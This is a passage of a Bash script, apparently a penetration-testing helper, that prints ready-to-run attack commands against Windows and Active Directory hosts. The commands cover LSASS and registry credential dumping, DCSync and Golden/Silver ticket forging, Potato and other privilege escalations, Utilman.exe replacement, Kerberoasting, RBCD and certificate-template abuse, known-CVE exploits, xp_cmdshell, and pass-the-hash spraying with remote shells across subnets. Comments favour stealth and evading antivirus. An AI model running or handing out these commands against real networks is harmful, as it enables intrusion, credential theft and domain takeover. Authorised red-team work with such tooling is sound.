            print_cmd "${XFREERDP_CMD} /v:${ip} /u:'${user}' /p:'${cred}' ${XFREERDP_CERT} /dynamic-resolution +clipboard"
        fi
        print_cmd "${NXC_CMD} rdp ${ip} ${auth_h} --screenshot --screentime 5  ${DIM}# verify RDP without opening GUI${NC}"
    fi

    # ── Credential Dumping ────────────────────────────────────────────────
    local step=2
    if [[ "$is_admin" == "true" ]]; then
        lprint "${BOLD}  [${step}] Credential Dumping ${BGRN}(Local Admin Confirmed)${NC}"; ((step++))
        print_note "Local admin → dump everything! Harvest creds to spray elsewhere"
        print_note "Priority: lsassy (stealthiest) → secretsdump (most complete) → SAM/LSA (quick)"
        lprint "    ${DIM}# ── LSASS Memory Dumps (plaintext + hashes from active sessions) ──${NC}"
        print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M lsassy        ${DIM}# in-memory LSASS dump (most AV-safe)${NC}"
        print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M nanodump       ${DIM}# LSASS via MiniDump handle bypass${NC}"
        print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M handlekatz     ${DIM}# duplicate LSASS handle technique${NC}"
        print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M procdump       ${DIM}# Sysinternals procdump${NC}"
        print_note "lsassy captures NTLM hashes + plaintext from logged-in sessions"
        lprint "    ${DIM}# ── Registry-Based Dumps (no LSASS touch = less detection) ──────${NC}"
        print_cmd "${NXC_CMD} smb ${ip} ${auth_h} --sam             ${DIM}# SAM hashes (local accounts)${NC}"
        print_cmd "${NXC_CMD} smb ${ip} ${auth_h} --lsa             ${DIM}# LSA secrets (service/cached creds)${NC}"
        print_cmd "${NXC_CMD} smb ${ip} ${auth_h} --dpapi           ${DIM}# DPAPI blobs: Chrome, WiFi, creds${NC}"
        print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M masky          ${DIM}# ADCS cert-based hash capture${NC}"
        print_note "--sam = local account hashes | --lsa = service passwords + cached domain creds"
        lprint "    ${DIM}# ── Remote All-in-One Dump (Impacket secretsdump): ──────────────${NC}"
        print_cmd "$(impacket_cmd secretsdump) ${auth_p}            ${DIM}# dump SAM + LSA + cached + DPAPI${NC}"
        print_cmd "$(impacket_cmd secretsdump) ${auth_p} -just-dc-ntlm  ${DIM}# DC only — NT hashes (fast)${NC}"
        print_note "secretsdump output: user:RID:LMhash:NThash::: → use NT hash for PTH"

        if [[ "$is_da" == "true" ]]; then
            lprint "${BOLD}  [DA] DCSync — Domain Full Compromise${NC}"
            print_note "Domain Admin confirmed → replicate ALL hashes from DC over the network"
            print_note "No need to touch NTDS.dit on disk — DCSync is cleaner and stealthier"
            local sd; sd=$(impacket_cmd secretsdump)
            print_cmd "${sd} ${auth_p} -just-dc-ntlm         ${DIM}# all domain NT hashes${NC}"
            print_cmd "${sd} ${auth_p} -just-dc              ${DIM}# all + Kerberos keys + history${NC}"
            print_cmd "${NXC_CMD} smb ${ip} ${auth_h} --ntds ${DIM}# NXC NTDS dump (saved to file)${NC}"
            lprint "    ${DIM}# Golden Ticket — dump krbtgt first:${NC}"
            print_cmd "${sd} ${auth_p} -just-dc-user krbtgt"
            print_cmd "$(impacket_cmd ticketer) -nthash KRBTGT_HASH -domain-sid DOMAIN_SID -domain ${domain:-DOMAIN} Administrator"
            lprint "    ${DIM}# Silver Ticket — for service impersonation:${NC}"
            print_cmd "$(impacket_cmd ticketer) -nthash SERVICE_HASH -domain-sid DOMAIN_SID -domain ${domain:-DOMAIN} -spn cifs/TARGET.${domain:-DOMAIN} Administrator"
        fi
    else
        lprint "${BOLD}  [${step}] Credential Hunting ${DIM}(not local admin — enumerate first)${NC}"; ((step++))
        print_note "No admin access → hunt for creds in shares, GPP, saved passwords, DPAPI"
        print_note "These don't require admin — find creds to escalate elsewhere"
        print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M gpp_password      ${DIM}# GPP stored plaintext passwords in SYSVOL${NC}"
        print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M gpp_autologin     ${DIM}# autologin credentials in Group Policy${NC}"
        print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M dpapi             ${DIM}# user DPAPI secrets (no admin needed)${NC}"
        print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M winscp            ${DIM}# WinSCP saved sessions & credentials${NC}"
        print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M mobaxterm          ${DIM}# MobaXterm saved credentials${NC}"
        print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M putty             ${DIM}# PuTTY saved private keys${NC}"
        print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M rdcman            ${DIM}# RDCMan saved connections + creds${NC}"
        print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M veeam             ${DIM}# Veeam backup service credentials${NC}"
        print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M keepass_discover   ${DIM}# locate KeePass .kdbx files${NC}"
        print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M keepass_trigger    ${DIM}# export KeePass db via trigger (no master pw)${NC}"
        lprint "    ${DIM}# Spider shares for juicy files (config, creds, scripts):${NC}"
        print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M spider_plus -o READ_ONLY=true EXCLUDE_EXTS=exe,dll,msi"
    fi

    # ── Privilege Escalation ──────────────────────────────────────────────
    if echo "$privs" | grep -qi "SeImpersonatePrivilege\|SeAssignPrimaryTokenPrivilege"; then
        lprint "${BOLD}  [${step}] PrivEsc — SeImpersonatePrivilege ${BRED}(POTATO ATTACKS)${NC}"; ((step++))
        print_note "SeImpersonatePrivilege = instant SYSTEM via Potato attacks"
        print_note "Common on IIS, MSSQL, service accounts — abuse token impersonation"
        if [[ "$is_admin" == "true" ]]; then
            print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M impersonate           ${DIM}# list available tokens${NC}"
            print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M impersonate -o TOKEN_ID=0  ${DIM}# steal SYSTEM token${NC}"
        fi
        lprint "    ${DIM}# Upload binary to C:\\Windows\\Temp\\ then execute:${NC}"
        print_cmd "GodPotato-NET4.exe -cmd 'net localgroup Administrators ${user} /add'"
        print_cmd "PrintSpoofer64.exe -i -c cmd                            ${DIM}# https://github.com/itm4n/PrintSpoofer${NC}"
        print_cmd "SweetPotato.exe -e EfsRpc -p cmd.exe                    ${DIM}# https://github.com/CCob/SweetPotato${NC}"
        print_cmd "JuicyPotatoNG.exe -t * -p cmd.exe -a '/c whoami > C:\\Temp\\out.txt'  ${DIM}# https://github.com/antonioCoco/JuicyPotatoNG${NC}"
        print_tip "Download GodPotato: https://github.com/BeichenDream/GodPotato/releases"
    fi

    if echo "$privs" | grep -qi "SeBackupPrivilege"; then
        lprint "${BOLD}  [${step}] PrivEsc — SeBackupPrivilege ${BRED}(NTDS.dit Extraction)${NC}"; ((step++))
        print_note "SeBackupPrivilege = read ANY file on the system (bypass ACLs)"
        print_note "Strategy: copy SAM/SYSTEM hives or NTDS.dit → extract hashes offline"
        lprint "    ${DIM}# In evil-winrm session:${NC}"
        print_cmd 'reg save HKLM\SYSTEM C:\Temp\SYSTEM.bak'
        print_cmd 'reg save HKLM\SAM C:\Temp\SAM.bak'
        print_cmd 'robocopy /b %SYSTEMROOT%\ntds C:\Temp ntds.dit'
        lprint "    ${DIM}# After downloading files locally:${NC}"
        print_cmd "$(impacket_cmd secretsdump) -ntds ntds.dit -system SYSTEM.bak LOCAL"
        print_cmd "$(impacket_cmd secretsdump) -sam SAM.bak -system SYSTEM.bak LOCAL"
    fi

    if echo "$privs" | grep -qi "SeDebugPrivilege"; then
        lprint "${BOLD}  [${step}] PrivEsc — SeDebugPrivilege ${BRED}(Direct LSASS Access)${NC}"; ((step++))
        print_note "SeDebugPrivilege = attach to ANY process including LSASS"
        print_note "Dump LSASS memory directly → extract plaintext passwords + NTLM hashes"
        print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M nanodump        ${DIM}# via nxc${NC}"
        lprint "    ${DIM}# In session (PowerShell):${NC}"
        print_cmd "rundll32 comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Temp\l.dmp full"
        print_cmd "pypykatz lsa minidump l.dmp  ${DIM}# parse locally${NC}"
    fi

    if echo "$privs" | grep -qi "SeTakeOwnershipPrivilege"; then
        lprint "${BOLD}  [${step}] PrivEsc — SeTakeOwnershipPrivilege ${BRED}(Own Any Object)${NC}"; ((step++))
        print_note "Take ownership of protected files → replace accessibility tools for SYSTEM shell"
        print_note "Classic: replace Utilman.exe with cmd.exe → press Win+U at RDP lock screen = SYSTEM"
        print_cmd "takeown /f C:\\Windows\\System32\\Utilman.exe"
        print_cmd "icacls C:\\Windows\\System32\\Utilman.exe /grant '${user}':F"
        print_cmd "copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\Utilman.exe"
        print_tip "RDP to target, press Win+U at lock screen → SYSTEM cmd.exe"
    fi

    if echo "$privs" | grep -qi "SeLoadDriverPrivilege"; then
        lprint "${BOLD}  [${step}] PrivEsc — SeLoadDriverPrivilege ${BRED}(Kernel Driver LPE)${NC}"; ((step++))
        print_tip "EoPLoadDriver: https://github.com/TarlogicSecurity/EoPLoadDriver"
        print_cmd "EoPLoadDriver.exe System\\CurrentControlSet\\MyService C:\\path\\Capcom.sys"
    fi

    if echo "$privs" | grep -qi "SeRestorePrivilege"; then
        lprint "${BOLD}  [${step}] PrivEsc — SeRestorePrivilege ${BRED}(Write Any File)${NC}"; ((step++))
        print_tip "Write to System32 → DLL hijack any privileged service"
        print_tip "Overwrite SAM/SECURITY/SYSTEM registry hives"
        print_cmd "# Copy evil DLL to C:\\Windows\\System32\\wbem\\wbemcomn.dll"
    fi

    if echo "$privs" | grep -qi "SeManageVolumePrivilege"; then
        lprint "${BOLD}  [${step}] PrivEsc — SeManageVolumePrivilege ${BRED}(Shadow Copy NTDS)${NC}"; ((step++))
        print_cmd "vssadmin create shadow /for=C:"
        print_cmd "copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopyX\\Windows\\NTDS\\ntds.dit C:\\Temp"
        print_cmd "copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopyX\\Windows\\System32\\config\\SYSTEM C:\\Temp"
        print_cmd "$(impacket_cmd secretsdump) -ntds ntds.dit -system SYSTEM LOCAL"
    fi

    # ── Token Impersonation ───────────────────────────────────────────────
    if [[ "$is_admin" == "true" ]]; then
        lprint "${BOLD}  [${step}] Token Impersonation${NC}"; ((step++))
        print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M impersonate              ${DIM}# enumerate all available tokens${NC}"
        print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M impersonate -o TOKEN_ID=0 ${DIM}# impersonate (0 = SYSTEM usually)${NC}"
        lprint "    ${DIM}# In evil-winrm with PowerView loaded:${NC}"
        print_cmd "Invoke-UserImpersonation -Credential (Get-Credential)"
        print_cmd "Invoke-RevertToSelf  ${DIM}# drop impersonation${NC}"
    fi

    # ── Host Enumeration ──────────────────────────────────────────────────
    lprint "${BOLD}  [${step}] Host Enumeration${NC}"; ((step++))
    print_note "Enumerate the target host — find users, services, shares, policies, AV"
    print_cmd "${NXC_CMD} smb ${ip} ${auth_h} --shares                    ${DIM}# SMB shares and permissions${NC}"
    print_cmd "${NXC_CMD} smb ${ip} ${auth_h} --users                     ${DIM}# domain/local users${NC}"
    print_cmd "${NXC_CMD} smb ${ip} ${auth_h} --groups                    ${DIM}# domain groups${NC}"
    print_cmd "${NXC_CMD} smb ${ip} ${auth_h} --local-groups               ${DIM}# local groups (incl. Administrators)${NC}"
    print_cmd "${NXC_CMD} smb ${ip} ${auth_h} --sessions                  ${DIM}# active user sessions on host${NC}"
    print_cmd "${NXC_CMD} smb ${ip} ${auth_h} --loggedon-users             ${DIM}# who is currently logged on${NC}"
    print_cmd "${NXC_CMD} smb ${ip} ${auth_h} --pass-pol                  ${DIM}# !! check lockout threshold before spraying !!${NC}"
    print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M enum_av                  ${DIM}# detect AV/EDR product${NC}"
    print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M enum_dns                 ${DIM}# enumerate internal DNS records${NC}"
    print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M subnets                  ${DIM}# find internal subnets from routes${NC}"
    print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M security-questions       ${DIM}# check stored security Q/A${NC}"
    print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M spider_plus -o READ_ONLY=true  ${DIM}# spider all shares for sensitive files${NC}"
    [[ "$is_admin" == "true" ]] && \
        print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M whoami               ${DIM}# verify execution context${NC}"

    # ── Active Directory Attacks ──────────────────────────────────────────
    lprint "${BOLD}  [${step}] Active Directory Attacks${NC}"; ((step++))
    print_note "These attacks target AD-specific weaknesses — Kerberoast and AS-REP work with any valid domain creds"
    lprint "    ${DIM}# ── Kerberoasting (crack service account passwords) ──────────${NC}"
    print_note "Request TGS tickets for SPN accounts → crack offline → no lockout risk"
    print_cmd "${NXC_CMD} ldap ${ip} ${auth_h} --kerberoasting kerberoast.txt    ${DIM}# request TGS for SPN accounts${NC}"
    print_cmd "$(impacket_cmd GetUserSPNs) ${auth_p} -outputfile kerberoast.txt  ${DIM}# impacket alternative${NC}"
    print_cmd "hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt  ${DIM}# crack RC4 TGS${NC}"
    print_cmd "hashcat -m 19600 kerberoast.txt /usr/share/wordlists/rockyou.txt  ${DIM}# crack AES128 TGS${NC}"
    print_cmd "hashcat -m 19700 kerberoast.txt /usr/share/wordlists/rockyou.txt  ${DIM}# crack AES256 TGS${NC}"
    lprint "    ${DIM}# ── AS-REP Roasting (no preauth accounts) ────────────────────${NC}"
    print_note "Accounts with 'Do not require Kerberos preauthentication' → crack AS-REP offline"
    print_cmd "${NXC_CMD} ldap ${ip} ${auth_h} --asreproast asrep.txt           ${DIM}# accounts without Kerberos preauth${NC}"
    print_cmd "$(impacket_cmd GetNPUsers) ${auth_p} -no-pass -request -outputfile asrep.txt  ${DIM}# impacket${NC}"
    print_cmd "hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt       ${DIM}# crack AS-REP${NC}"
    lprint "    ${DIM}# ── BloodHound (map attack paths visually) ────────────────────${NC}"
    print_note "Collect AD data → import to BloodHound → find shortest path to DA"
    print_cmd "${NXC_CMD} ldap ${ip} ${auth_h} --bloodhound -c All              ${DIM}# full collection via nxc${NC}"
    print_cmd "${NXC_CMD} ldap ${ip} ${auth_h} --bloodhound -c DCOnly           ${DIM}# DC-only (faster, less noise)${NC}"
    if [[ -n "$domain" ]]; then
        if [[ "$use_hash" == "1" ]]; then
            print_cmd "bloodhound-python -u '${user}' --hashes :${hash_val} -d ${domain} -ns ${ip} -c All --zip"
        else
            print_cmd "bloodhound-python -u '${user}' -p '${cred}' -d ${domain} -ns ${ip} -c All --zip"
        fi
    fi
    lprint "    ${DIM}# ── LDAP Enumeration (find misconfigs + attack surface) ──────${NC}"
    print_note "Low-noise recon — query AD directly for creds, ACLs, groups, machine quotas"
    print_cmd "${NXC_CMD} ldap ${ip} ${auth_h} -M get-desc-users             ${DIM}# passwords in user descriptions${NC}"
    print_cmd "${NXC_CMD} ldap ${ip} ${auth_h} -M MAQ                        ${DIM}# machine account quota (RBCD prereq)${NC}"
    print_cmd "${NXC_CMD} ldap ${ip} ${auth_h} -M ldap-checker               ${DIM}# signing / channel binding config${NC}"
    print_cmd "${NXC_CMD} ldap ${ip} ${auth_h} -M find-computer              ${DIM}# search computers by OS/name${NC}"
    print_cmd "${NXC_CMD} ldap ${ip} ${auth_h} -M groupmembership -o USER=${user}  ${DIM}# all groups this user is in${NC}"
    print_cmd "${NXC_CMD} ldap ${ip} ${auth_h} -M daclread -o TARGET=${user}       ${DIM}# ACL rights on this user object${NC}"
    lprint "    ${DIM}# ── Vulnerability Checks (known CVEs) ─────────────────────────${NC}"
    print_note "Check for known unpatched vulns — these can give instant DA"
    print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M nopac                         ${DIM}# CVE-2021-42278/42287 (sAMAccountName spoofing)${NC}"
    print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M zerologon                     ${DIM}# CVE-2020-1472 (Netlogon)${NC}"
    print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M petitpotam                    ${DIM}# CVE-2021-36942 (NTLM coerce via EFS)${NC}"
    print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M ms17-010                      ${DIM}# CVE-2017-0144 EternalBlue${NC}"
    print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M printnightmare                ${DIM}# CVE-2021-1675/34527${NC}"
    print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M shadowrdp                     ${DIM}# enable Shadow RDP hijack${NC}"
    print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M badsuccessor                  ${DIM}# CVE-2024-26229 child/parent OU esc${NC}"

    # ── Kerberos Attacks ──────────────────────────────────────────────────
    lprint "${BOLD}  [${step}] Kerberos / Delegation Attacks${NC}"; ((step++))
    print_note "Kerberos ticket abuse + delegation misconfigs = lateral movement without passwords"
    lprint "    ${DIM}# ── Pass-the-Ticket (hash or password → TGT → access resources) ──${NC}"
    print_note "Get a TGT ticket → load into environment → authenticate without the password"
    if [[ "$use_hash" == "1" ]]; then
        print_cmd "$(impacket_cmd getTGT) '${dom_prefix}${user}' -hashes :${hash_val}  ${DIM}# get TGT → .ccache${NC}"
    else
        print_cmd "$(impacket_cmd getTGT) '${dom_prefix}${user}':'${cred}'             ${DIM}# get TGT → .ccache${NC}"
    fi
    print_cmd "export KRB5CCNAME=\$(ls *.ccache | head -1)                    ${DIM}# load ticket${NC}"
    print_cmd "$(impacket_cmd psexec) -k -no-pass '${dom_prefix:-DOMAIN\\}${user}'@${ip}  ${DIM}# PtT SYSTEM shell${NC}"
    lprint "    ${DIM}# ── Delegation (find hosts that can impersonate users) ──${NC}"
    print_note "Unconstrained delegation = host can impersonate ANY user to ANY service"
    print_note "Constrained = specific services only | RBCD = you can configure it yourself"
    print_cmd "${NXC_CMD} ldap ${ip} ${auth_h} --trusted-for-delegation        ${DIM}# find unconstrained delegation hosts${NC}"
    print_cmd "$(impacket_cmd findDelegation) ${auth_p}                         ${DIM}# all delegation configs${NC}"
    lprint "    ${DIM}# ── RBCD (Resource-Based Constrained Delegation — no admin needed!) ──${NC}"
    print_note "If MachineAccountQuota > 0, create a machine account → configure RBCD → get service ticket as admin"
    print_note "Prereq: GenericAll/GenericWrite on target computer object OR MachineAccountQuota > 0"
    print_tip "Requires MAQ > 0. Add a machine account, set msDS-AllowedToActOnBehalfOfOtherIdentity"
    print_cmd "$(impacket_cmd addcomputer) ${auth_p} -computer-name 'EVIL\$' -computer-pass 'P@ss123'"
    print_cmd "$(impacket_cmd rbcd) ${auth_p} -action write -delegate-to TARGET\$ -delegate-from EVIL\$"
    print_cmd "$(impacket_cmd getST) ${auth_p} -spn cifs/TARGET.${domain:-DOMAIN} -impersonate Administrator"

    # ── AD CS ─────────────────────────────────────────────────────────────
    lprint "${BOLD}  [${step}] AD Certificate Services (ADCS)${NC}"; ((step++))
    print_note "ADCS misconfigs (ESC1-ESC13) = request cert as any user → authenticate as DA"
    print_note "certipy find -vulnerable shows exploitable templates — check ESC1 first (most common)"
    print_cmd "${NXC_CMD} ldap ${ip} ${auth_h} -M certipy-find                  ${DIM}# find vulnerable cert templates via nxc${NC}"
    if tool_exists certipy-ad || tool_exists certipy; then
        local cb="certipy-ad"; tool_exists certipy && cb="certipy"
        local dom_part=""; [[ -n "$domain" ]] && dom_part="@${domain}"
        if [[ "$use_hash" == "1" ]]; then
            print_cmd "${cb} find -u '${user}${dom_part}' -hashes :${hash_val} -target ${ip} -vulnerable -stdout"
            print_cmd "${cb} req  -u '${user}${dom_part}' -hashes :${hash_val} -target ${ip} -ca 'CA-NAME' -template 'TEMPLATE'"
        else
            print_cmd "${cb} find -u '${user}${dom_part}' -p '${cred}' -target ${ip} -vulnerable -stdout  ${DIM}# ESC1-ESC13${NC}"
            print_cmd "${cb} req  -u '${user}${dom_part}' -p '${cred}' -target ${ip} -ca 'CA-NAME' -template 'TEMPLATE'"
        fi
        print_cmd "${cb} auth -pfx user.pfx                                    ${DIM}# cert → NT hash via PKINIT${NC}"
        print_cmd "$(impacket_cmd gettgt) -pfx-file user.pfx '${dom_prefix}${user}'  ${DIM}# cert → TGT ccache${NC}"
    else
        print_tip "pip install certipy-ad  — ESC1-ESC13 exploitation framework"
    fi

    # ── MSSQL-specific ────────────────────────────────────────────────────
    if [[ "$tool" == "mssql" ]]; then
        lprint "${BOLD}  [${step}] MSSQL Post-Exploitation${NC}"; ((step++))
        print_note "MSSQL sysadmin = OS command execution via xp_cmdshell"
        print_note "Also check: linked servers (pivot to other SQL servers), impersonation rights"
        print_warn "xp_cmdshell NOW ENABLED — disable immediately after engagement!"
        print_cmd "$(impacket_cmd mssqlclient) ${auth_p} -windows-auth"
        print_cmd "${NXC_CMD} mssql ${ip} ${auth_h} -q \"SELECT name FROM master.dbo.sysdatabases\""
        print_cmd "${NXC_CMD} mssql ${ip} ${auth_h} -q \"SELECT IS_SRVROLEMEMBER('sysadmin'), SYSTEM_USER\""
        print_cmd "${NXC_CMD} mssql ${ip} ${auth_h} -q \"SELECT * FROM OPENROWSET(BULK N'C:\\Windows\\win.ini', SINGLE_CLOB) AS Contents\""
        print_cmd "${NXC_CMD} mssql ${ip} ${auth_h} -M mssql_priv              ${DIM}# find impersonation / trustworthy privesc${NC}"
        lprint "    ${DIM}# mssqlclient.py interactive commands:${NC}"
        print_cmd "enable_xp_cmdshell"
        print_cmd "xp_cmdshell whoami /all"
        print_cmd "xp_cmdshell net localgroup Administrators"
        print_cmd "# DISABLE WHEN DONE: exec sp_configure 'xp_cmdshell',0; RECONFIGURE"
    fi

    # ══════════════════════════════════════════════════════════════════════
    # COMPREHENSIVE LATERAL MOVEMENT — ALL SCENARIOS
    # ══════════════════════════════════════════════════════════════════════
    lprint "${BOLD}  [${step}] Lateral Movement${NC}"; ((step++))

    # ── [A] DISCOVERY — find where to move ────────────────────────────────
    lprint "    ${BOLD}${CYAN}┌─ [A] Target Discovery — find next hops ─────────────────────${NC}"
    print_note "Before moving laterally, map the environment to find where your creds work"
    print_note "Priority: find hosts where you're LOCAL ADMIN (Pwn3d!) or where high-value users are logged in"
    print_cmd "${NXC_CMD} smb SUBNET/24 ${auth_h} --shares               ${DIM}# map all reachable SMB hosts + shares${NC}"
    print_cmd "${NXC_CMD} smb SUBNET/24 ${auth_h}                        ${DIM}# identify which hosts accept these creds${NC}"
    print_cmd "${NXC_CMD} smb ${ip} ${auth_h} --sessions                 ${DIM}# where are high-value users logged in?${NC}"
    print_cmd "${NXC_CMD} smb ${ip} ${auth_h} --loggedon-users            ${DIM}# active sessions on current host${NC}"
    print_cmd "${NXC_CMD} ldap ${ip} ${auth_h} -M get-network            ${DIM}# enumerate subnets from AD Sites${NC}"
    print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M subnets                 ${DIM}# find additional subnets from routes${NC}"
    print_cmd "${NXC_CMD} ldap ${ip} ${auth_h} -M find-computer          ${DIM}# list all domain computers${NC}"
    print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M enum_dns                ${DIM}# find internal DNS records / hidden hosts${NC}"
    if [[ -n "$domain" ]]; then
        print_cmd "$(impacket_cmd GetADUsers) ${auth_p} -all              ${DIM}# all domain users${NC}"
        print_cmd "$(impacket_cmd GetUserSPNs) ${auth_p}                  ${DIM}# service accounts (kerberoast targets)${NC}"
    fi
    print_cmd "${NXC_CMD} smb ${ip} ${auth_h} --gen-relay-list relay_targets.txt  ${DIM}# hosts without SMB signing → relay targets${NC}"

    # ── [B] ADMIN LATERAL MOVEMENT — full exec across subnet ──────────────
    if [[ "$is_admin" == "true" ]]; then
        lprint "    ${BOLD}${GREEN}┌─ [B] Admin Lateral Movement ${BGRN}(Local Admin) ───────────────${NC}"
        print_note "You're local admin → you can dump creds, exec remotely, and spray the subnet"
        print_note "Strategy: dump creds first → spray those hashes everywhere → expand access"

        lprint "    ${DIM}# ── B.1) Credential Harvesting for Spray ─────────────────────${NC}"
        print_note "Dump creds from this host → use them to spray the entire subnet"
        print_cmd "$(impacket_cmd secretsdump) ${auth_p}                   ${DIM}# dump SAM + LSA + cached → harvest hashes for spray${NC}"
        print_cmd "${NXC_CMD} smb ${ip} ${auth_h} --sam                    ${DIM}# SAM hashes (local accounts, fast)${NC}"
        print_cmd "${NXC_CMD} smb ${ip} ${auth_h} --lsa                    ${DIM}# LSA secrets (service creds, cached domain creds)${NC}"
        print_cmd "${NXC_CMD} smb ${ip} ${auth_h} -M lsassy                ${DIM}# in-memory LSASS → plaintext + hashes${NC}"
        print_cmd "${NXC_CMD} smb ${ip} ${auth_h} --dpapi                  ${DIM}# DPAPI blobs → Chrome passwords, WiFi keys, saved creds${NC}"

        lprint "    ${DIM}# ── B.2) Pass-the-Hash Spray Across Subnet ──────────────────${NC}"
        print_note "Spray dumped hashes across the subnet — look for (Pwn3d!) = local admin"
        print_note "Try ALL protocols: SMB, WinRM, WMI, RDP, MSSQL, SSH"
        print_cmd "${NXC_CMD} smb SUBNET/24 -u Administrator -H DUMPED_HASH --local-auth  ${DIM}# spray local admin hash everywhere${NC}"
        print_cmd "${NXC_CMD} smb SUBNET/24 ${auth_h}                      ${DIM}# spray current creds across subnet${NC}"
        print_cmd "${NXC_CMD} winrm SUBNET/24 ${auth_h}                    ${DIM}# spray WinRM (stealthier than SMB exec)${NC}"
        print_cmd "${NXC_CMD} wmi SUBNET/24 ${auth_h}                      ${DIM}# spray WMI (often less monitored)${NC}"
        print_cmd "${NXC_CMD} rdp SUBNET/24 ${auth_h}                      ${DIM}# spray RDP (check if RDP access works)${NC}"
        print_cmd "${NXC_CMD} mssql SUBNET/24 ${auth_h}                    ${DIM}# spray MSSQL (find SQL servers with these creds)${NC}"
        print_cmd "${NXC_CMD} ssh SUBNET/24 ${auth_h}                      ${DIM}# spray SSH (Linux hosts in same domain)${NC}"

        lprint "    ${DIM}# ── B.3) Impacket Remote Execution → NEXT_TARGET ────────────${NC}"
        print_note "Direct remote shell on next target — wmiexec (stealthiest) → smbexec → psexec (noisiest)"
        local wex sex pex dex atex
        wex=$(impacket_cmd wmiexec); sex=$(impacket_cmd smbexec)
        pex=$(impacket_cmd psexec);  dex=$(impacket_cmd dcomexec)
        atex=$(impacket_cmd atexec)
        print_cmd "${wex} ${auth_p_next}                                   ${DIM}# WMIexec → semi-interactive shell (least detected)${NC}"
        print_cmd "${sex} ${auth_p_next}                                   ${DIM}# SMBexec → stealthier, no binary drop${NC}"
        print_cmd "${pex} ${auth_p_next}                                   ${DIM}# PsExec → SYSTEM shell (drops service binary)${NC}"
        print_cmd "${dex} ${auth_p_next} 'cmd.exe'                         ${DIM}# DCOM → alternative exec (MMC20, ShellWindows)${NC}"
        print_cmd "${atex} ${auth_p_next} 'whoami'                         ${DIM}# Scheduled task → single command exec${NC}"

        lprint "    ${DIM}# ── B.4) WinRM Lateral Movement → NEXT_TARGET ───────────────${NC}"
        print_note "Port 5985/5986 | Requires: Administrators or Remote Management Users group"
        if [[ "$use_hash" == "1" ]]; then
            print_cmd "${WINRM_CMD} -i NEXT_TARGET -u '${user}' -H ${hash_val}  ${DIM}# evil-winrm PTH shell${NC}"
        else
            print_cmd "${WINRM_CMD} -i NEXT_TARGET -u '${user}' -p '${cred}'    ${DIM}# evil-winrm password shell${NC}"
        fi
        lprint "    ${DIM}# PowerShell remoting from compromised host:${NC}"
        print_cmd "Enter-PSSession -ComputerName NEXT_TARGET -Credential \$cred  ${DIM}# PS remoting${NC}"
        print_cmd "Invoke-Command -ComputerName NEXT_TARGET -Credential \$cred -ScriptBlock {whoami /all}  ${DIM}# run cmd remotely${NC}"
        print_cmd "Invoke-Command -ComputerName HOST1,HOST2,HOST3 -Credential \$cred -ScriptBlock {hostname}  ${DIM}# fan-out to multiple hosts${NC}"

        lprint "    ${DIM}# ── B.5) RDP Lateral Movement → NEXT_TARGET ─────────────────${NC}"
        print_note "Port 3389 | PTH RDP requires 'Restricted Admin Mode' enabled on target"
        if [[ "$use_hash" == "1" ]]; then
            print_cmd "${XFREERDP_CMD} /v:NEXT_TARGET /u:'${user}' /pth:${hash_val} ${XFREERDP_CERT} /dynamic-resolution +clipboard  ${DIM}# PTH RDP${NC}"
        else
            print_cmd "${XFREERDP_CMD} /v:NEXT_TARGET /u:'${user}' /p:'${cred}' ${XFREERDP_CERT} /dynamic-resolution +clipboard  ${DIM}# password RDP${NC}"
        fi
        print_cmd "${NXC_CMD} smb NEXT_TARGET ${auth_h} -x 'reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f'  ${DIM}# enable RDP remotely${NC}"
        print_cmd "${NXC_CMD} smb NEXT_TARGET ${auth_h} -x 'netsh advfirewall firewall set rule group=\"Remote Desktop\" new enable=Yes'  ${DIM}# open RDP firewall rule${NC}"
        print_cmd "${NXC_CMD} smb NEXT_TARGET ${auth_h} -M rdp -o ACTION=enable  ${DIM}# nxc RDP enable module${NC}"
        print_cmd "${NXC_CMD} smb NEXT_TARGET ${auth_h} -M shadowrdp             ${DIM}# shadow existing RDP session (no new logon)${NC}"

        lprint "    ${DIM}# ── B.6) Service Creation / Scheduled Task Persistence ──────${NC}"
        print_note "Create a service or schtask that runs your payload — persists across reboots"
